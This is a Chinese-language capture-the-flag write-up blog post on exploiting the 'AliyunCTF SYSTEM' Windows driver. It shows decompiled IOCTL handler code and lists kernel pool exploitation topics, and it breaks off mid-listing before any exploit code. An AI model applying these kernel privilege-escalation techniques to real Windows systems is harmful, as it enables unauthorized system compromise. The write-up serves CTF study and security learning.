<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Windows Driver Exploit">
<meta property="og:type" content="article">
<meta property="og:title" content="AliyunCTF SYSTEM">
<meta property="og:url" content="https://ha0-y.github.io/2024/04/25/AliyunCTF-SYSTEM/index.html">
<meta property="og:site_name" content="h4m5ter">
<meta property="og:description" content="Windows Driver Exploit">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2024-04-25T04:00:00.000Z">
<meta property="article:modified_time" content="2024-04-29T09:36:00.588Z">
<meta property="article:author" content="h4m5ter">
<meta property="article:tag" content="Windows">
<meta name="twitter:card" content="summary">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>AliyunCTF SYSTEM</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.2.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/Ha0-Y">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2024/04/30/D3CTF-d3lgfs/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2024/04/15/ELFNote-leak-kernel-base/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ha0-y.github.io/2024/04/25/AliyunCTF-SYSTEM/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ha0-y.github.io/2024/04/25/AliyunCTF-SYSTEM/&text=AliyunCTF SYSTEM"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ha0-y.github.io/2024/04/25/AliyunCTF-SYSTEM/&title=AliyunCTF SYSTEM"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ha0-y.github.io/2024/04/25/AliyunCTF-SYSTEM/&is_video=false&description=AliyunCTF SYSTEM"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=AliyunCTF SYSTEM&body=Check out this article: https://ha0-y.github.io/2024/04/25/AliyunCTF-SYSTEM/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ha0-y.github.io/2024/04/25/AliyunCTF-SYSTEM/&title=AliyunCTF SYSTEM"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ha0-y.github.io/2024/04/25/AliyunCTF-SYSTEM/&title=AliyunCTF SYSTEM"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ha0-y.github.io/2024/04/25/AliyunCTF-SYSTEM/&title=AliyunCTF SYSTEM"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ha0-y.github.io/2024/04/25/AliyunCTF-SYSTEM/&title=AliyunCTF SYSTEM"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ha0-y.github.io/2024/04/25/AliyunCTF-SYSTEM/&name=AliyunCTF SYSTEM&description=&lt;blockquote&gt;
&lt;p&gt;Windows Driver Exploit&lt;/p&gt;
&lt;/blockquote&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ha0-y.github.io/2024/04/25/AliyunCTF-SYSTEM/&t=AliyunCTF SYSTEM"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Driver"><span class="toc-number">1.</span> <span class="toc-text">Driver</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MDL"><span class="toc-number">1.1.</span> <span class="toc-text">MDL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#API"><span class="toc-number">1.2.</span> <span class="toc-text">API</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Debug"><span class="toc-number">1.3.</span> <span class="toc-text">Debug</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Io-NpFr-Ws2P"><span class="toc-number">1.4.</span> <span class="toc-text">Io&#x2F;NpFr&#x2F;Ws2P</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#IO"><span class="toc-number">1.4.1.</span> <span class="toc-text">IO</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Ws2P"><span class="toc-number">1.4.2.</span> <span class="toc-text">Ws2P</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CLFS"><span class="toc-number">1.5.</span> <span class="toc-text">CLFS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#More"><span class="toc-number">2.</span> <span class="toc-text">More</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7"><span class="toc-number">2.1.</span> <span class="toc-text">工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#windows-driver-reverse"><span class="toc-number">2.2.</span> <span class="toc-text">windows driver reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Devices-Symlinks"><span class="toc-number">2.2.1.</span> <span class="toc-text">Devices &amp; Symlinks</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Dispatch-Routines"><span class="toc-number">2.2.2.</span> <span class="toc-text">Dispatch Routines</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-Kernel-HeapFengshui"><span class="toc-number">2.3.</span> <span class="toc-text">Windows Kernel HeapFengshui</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NtQuerySystemInformation"><span class="toc-number">2.4.</span> <span class="toc-text">NtQuerySystemInformation</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SystemModuleInformation"><span class="toc-number">2.4.1.</span> <span class="toc-text">SystemModuleInformation</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SystemExtendedHandleInformation"><span class="toc-number">2.4.2.</span> <span class="toc-text">SystemExtendedHandleInformation</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Scoop-the-Windows-10-pool"><span class="toc-number">2.5.</span> <span class="toc-text">Scoop the Windows 10 pool!</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#pool"><span class="toc-number">2.5.1.</span> <span class="toc-text">pool</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Segment-Backend"><span class="toc-number">2.5.1.1.</span> <span class="toc-text">Segment Backend</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Variable-Size-Backend"><span class="toc-number">2.5.1.2.</span> <span class="toc-text">Variable Size Backend</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Low-Fragmentation-Heap-Backend"><span class="toc-number">2.5.1.3.</span> <span class="toc-text">Low Fragmentation Heap Backend</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BC%93%E5%AD%98%E5%AF%B9%E9%BD%90"><span class="toc-number">2.5.1.4.</span> <span class="toc-text">缓存对齐</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Generic-Exploitation"><span class="toc-number">2.5.2.</span> <span class="toc-text">Generic Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#PipeAttribute"><span class="toc-number">2.5.2.1.</span> <span class="toc-text">PipeAttribute</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#NpFr"><span class="toc-number">2.5.2.2.</span> <span class="toc-text">NpFr</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#spray"><span class="toc-number">2.5.3.</span> <span class="toc-text">spray</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#IO-Ring"><span class="toc-number">2.5.4.</span> <span class="toc-text">IO Ring</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PreviousMode"><span class="toc-number">2.5.5.</span> <span class="toc-text">PreviousMode</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#New"><span class="toc-number">2.5.6.</span> <span class="toc-text">New</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NPFS-SYS"><span class="toc-number">2.6.</span> <span class="toc-text">NPFS.SYS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DATA-QUEUE-ENTRY"><span class="toc-number">2.6.1.</span> <span class="toc-text">DATA_QUEUE_ENTRY</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#npfs-NpAddDataQueueEntry"><span class="toc-number">2.6.2.</span> <span class="toc-text">npfs!NpAddDataQueueEntry</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NonPagedPool-Overflow"><span class="toc-number">2.7.</span> <span class="toc-text">NonPagedPool Overflow</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%A2%E5%87%BA%E6%95%B0%E6%8D%AE%E8%B6%B3%E5%A4%9F%E5%A4%9A"><span class="toc-number">2.7.1.</span> <span class="toc-text">溢出数据足够多</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%A2%E5%87%BA%E9%95%BF%E5%BA%A6%E6%AF%94%E8%BE%83%E5%B0%8F"><span class="toc-number">2.7.2.</span> <span class="toc-text">溢出长度比较小</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#overflow-%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99"><span class="toc-number">2.7.3.</span> <span class="toc-text">overflow-&gt;任意地址写</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HITCON-2020-lucifer"><span class="toc-number">2.8.</span> <span class="toc-text">HITCON 2020 lucifer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#API-%E5%89%8D%E7%BC%80"><span class="toc-number">2.9.</span> <span class="toc-text">API 前缀</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#reference"><span class="toc-number">2.10.</span> <span class="toc-text">reference</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        AliyunCTF SYSTEM
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">h4m5ter</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-04-25T04:00:00.000Z" class="dt-published" itemprop="datePublished">2024-04-25</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categorievariants/CSE/">CSE</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/Windows/" rel="tag">Windows</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <blockquote>
<p>Windows Driver Exploit</p>
</blockquote>
<span id="more"></span>

<p>知识点蛮多的</p>
<h2 id="Driver"><a href="#Driver" class="headerlink" title="Driver"></a>Driver</h2><p>是个驱动，内容比较少，稍微看一下逻辑</p>
<p>驱动入口：DriverEntry，第一个函数是Windows给程序加了 <code>_security_cookie</code>，然后初始化DriverObject</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS __stdcall <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">sub_14000610C</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Init</span>(DriverObject);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>初始化DriverObject。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS __fastcall <span class="title">Init</span><span class="params">(PDRIVER_OBJECT DriverObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  NTSTATUS result; <span class="comment">// eax</span></span><br><span class="line">  NTSTATUS v3; <span class="comment">// ebx</span></span><br><span class="line">  _OWORD *DeviceExtension; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_UNICODE_STRING</span> DeviceName; <span class="comment">// [rsp+40h] [rbp-28h] BYREF</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_UNICODE_STRING</span> DestinationString; <span class="comment">// [rsp+50h] [rbp-18h] BYREF</span></span><br><span class="line">  PDEVICE_OBJECT DeviceObject; <span class="comment">// [rsp+80h] [rbp+18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  DeviceObject = <span class="number">0</span>i64;</span><br><span class="line">  <span class="built_in">RtlInitUnicodeString</span>(&amp;DeviceName, <span class="string">L&quot;\\Device\\SIOCTL&quot;</span>);</span><br><span class="line">  result = <span class="built_in">IoCreateDevice</span>(DriverObject, <span class="number">0x30</span>u, &amp;DeviceName, <span class="number">0x22</span>u, <span class="number">0x100</span>u, <span class="number">0</span>, &amp;DeviceObject);</span><br><span class="line">  <span class="keyword">if</span> ( result &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    DriverObject-&gt;MajorFunction[<span class="number">0</span>] = (PDRIVER_DISPATCH)DispatchCommon;</span><br><span class="line">    DriverObject-&gt;MajorFunction[<span class="number">2</span>] = (PDRIVER_DISPATCH)DispatchCommon;</span><br><span class="line">    DriverObject-&gt;MajorFunction[<span class="number">14</span>] = (PDRIVER_DISPATCH)DispatchControl;</span><br><span class="line">    DriverObject-&gt;DriverUnload = (PDRIVER_UNLOAD)Unload;</span><br><span class="line">    <span class="built_in">RtlInitUnicodeString</span>(&amp;DestinationString, <span class="string">L&quot;\\DosDevices\\IoctlTest&quot;</span>);</span><br><span class="line">    v3 = <span class="built_in">IoCreateSymbolicLink</span>(&amp;DestinationString, &amp;DeviceName);</span><br><span class="line">    DeviceExtension = DeviceObject-&gt;DeviceExtension;</span><br><span class="line">    *DeviceExtension = <span class="number">0</span>i64;</span><br><span class="line">    DeviceExtension[<span class="number">1</span>] = <span class="number">0</span>i64;</span><br><span class="line">    DeviceExtension[<span class="number">2</span>] = <span class="number">0</span>i64;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &lt; <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">IoDeleteDevice</span>(DeviceObject);</span><br><span class="line">    <span class="keyword">return</span> v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    _mm_lfence();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>DispatchCommon</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_CREATE                     0x00 </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_CLOSE                      0x02 </span></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">DispatchCommon</span><span class="params">(__int64 a1, IRP *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  a2-&gt;IoStatus.Status = <span class="number">0</span>;</span><br><span class="line">  a2-&gt;IoStatus.Information = <span class="number">0</span>i64;</span><br><span class="line">  <span class="built_in">IofCompleteRequest</span>(a2, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>我们可以控制的是size的大小，并且这个size大小为0x1000的倍数，向上取整</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_DEVICE_CONTROL           0x0e</span></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">DispatchControl</span><span class="params">(PDEVICE_OBJECT pDeviceObject, IRP *irp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_STACK_LOCATION</span> *CurrentStackLocation; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// ebx</span></span><br><span class="line">  PVOID DeviceExtension; <span class="comment">// rdi</span></span><br><span class="line">  ULONG ulInputBufferLength; <span class="comment">// r8d</span></span><br><span class="line">  ULONG ulOutputBufferLength; <span class="comment">// edx</span></span><br><span class="line">  ULONG ulIoControlCode; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> *__pStartAddr2; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_MDL</span> *__pMdl2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">void</span> *__pVirtualAddress; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_MDL</span> *__pMdl; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">char</span> *buffer; <span class="comment">// r13</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> _usSize; <span class="comment">// r15d</span></span><br><span class="line">  PVOID ContiguousMemory; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">void</span> *_pVirtualAddress; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_MDL</span> *Mdl; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_MDL</span> *_pMdl; <span class="comment">// r14</span></span><br><span class="line">  PVOID pStartAddr2; <span class="comment">// rax</span></span><br><span class="line">  PVOID _pStartAddr2; <span class="comment">// r12</span></span><br><span class="line">  _DWORD *SystemBuffer; <span class="comment">// r13</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> usSize; <span class="comment">// r15d</span></span><br><span class="line">  PVOID pVirtualAddress; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_MDL</span> *pMdl; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> pMapAddr; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> _pMapAddr; <span class="comment">// r12d</span></span><br><span class="line"></span><br><span class="line">  CurrentStackLocation = irp-&gt;Tail.Overlay.CurrentStackLocation;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  DeviceExtension = pDeviceObject-&gt;DeviceExtension;</span><br><span class="line">  ulInputBufferLength = CurrentStackLocation-&gt;Parameters.DeviceIoControl.InputBufferLength;</span><br><span class="line">  ulOutputBufferLength = CurrentStackLocation-&gt;Parameters.DeviceIoControl.OutputBufferLength;</span><br><span class="line">  <span class="keyword">if</span> ( !ulInputBufferLength || !ulOutputBufferLength )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="number">0xC000000D</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">  &#125;</span><br><span class="line">  ulIoControlCode = CurrentStackLocation-&gt;Parameters.DeviceIoControl.IoControlCode;</span><br><span class="line">  <span class="keyword">switch</span> ( ulIoControlCode )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x9C402400</span>:</span><br><span class="line">      <span class="keyword">if</span> ( ulInputBufferLength != <span class="number">4</span> || ulOutputBufferLength != <span class="number">8</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">      SystemBuffer = irp-&gt;AssociatedIrp.SystemBuffer;</span><br><span class="line">      usSize = (*SystemBuffer + <span class="number">0xFFF</span>) &amp; <span class="number">0xFFFFF000</span>;</span><br><span class="line">      pVirtualAddress = <span class="built_in">MmAllocateContiguousMemory</span>(usSize, (PHYSICAL_ADDRESS)<span class="number">0xFFFFFFFFFFFFFFFF</span>ui64);</span><br><span class="line">      _pVirtualAddress = pVirtualAddress;</span><br><span class="line">      <span class="keyword">if</span> ( pVirtualAddress )</span><br><span class="line">      &#123;</span><br><span class="line">        pMdl = <span class="built_in">IoAllocateMdl</span>(pVirtualAddress, usSize, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>i64);/</span><br><span class="line">        _pMdl = pMdl;</span><br><span class="line">        <span class="keyword">if</span> ( pMdl )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">MmBuildMdlForNonPagedPool</span>(pMdl); </span><br><span class="line">          pMapAddr = (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">MmMapLockedPagesSpecifyCache</span>(_pMdl, <span class="number">1</span>, MmNonCached, <span class="number">0</span>i64, <span class="number">0</span>, <span class="number">0x10</span>u);</span><br><span class="line">          _pMapAddr = pMapAddr;</span><br><span class="line">          <span class="keyword">if</span> ( pMapAddr )</span><br><span class="line">          &#123;</span><br><span class="line">            *(_QWORD *)DeviceExtension = pMapAddr;</span><br><span class="line">            *((_QWORD *)DeviceExtension + <span class="number">1</span>) = _pVirtualAddress;</span><br><span class="line">            *((_QWORD *)DeviceExtension + <span class="number">2</span>) = _pMdl;</span><br><span class="line">            <span class="built_in">Memset</span>(<span class="type">void</span> *)pMapAddr, <span class="number">0xFF</span>, usSize);</span><br><span class="line">            *SystemBuffer = usSize;             </span><br><span class="line">            SystemBuffer[<span class="number">1</span>] = _pMapAddr;        </span><br><span class="line">            irp-&gt;IoStatus.Information = <span class="number">8</span>i64;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">          &#125;</span><br><span class="line">LABEL_31:</span><br><span class="line">          <span class="built_in">IoFreeMdl</span>(_pMdl);</span><br><span class="line">        &#125;</span><br><span class="line">LABEL_29:</span><br><span class="line">        <span class="built_in">MmFreeContiguousMemory</span>(_pVirtualAddress);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0xC000009A</span>i64;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x9C402404</span>:</span><br><span class="line">      <span class="keyword">if</span> ( ulInputBufferLength != <span class="number">4</span> || ulOutputBufferLength != <span class="number">12</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">      buffer = (<span class="type">char</span> *)irp-&gt;AssociatedIrp.SystemBuffer;</span><br><span class="line">      _usSize = (*(_DWORD *)buffer + <span class="number">0xFFF</span>) &amp; <span class="number">0xFFFFF000</span>;</span><br><span class="line">      ContiguousMemory = <span class="built_in">MmAllocateContiguousMemory</span>(_usSize, (PHYSICAL_ADDRESS)<span 